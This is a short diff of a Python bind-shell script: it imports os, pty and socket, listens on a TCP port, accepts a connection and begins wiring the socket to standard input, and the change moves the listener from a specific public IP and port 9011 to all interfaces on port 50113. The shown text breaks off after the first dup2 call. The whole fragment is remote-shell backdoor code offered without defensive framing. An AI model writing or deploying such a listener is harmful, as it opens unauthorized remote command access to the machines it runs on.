@@ -4,11 +4,11 @@ import os
 import pty
 import socket
 
-lport = 9011
+lport = 50113
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('54.67.45.208', lport))
+    s.bind(('', lport))
     s.listen(1)
     (rem, addr) = s.accept()
     os.dup2(rem.fileno(),0)
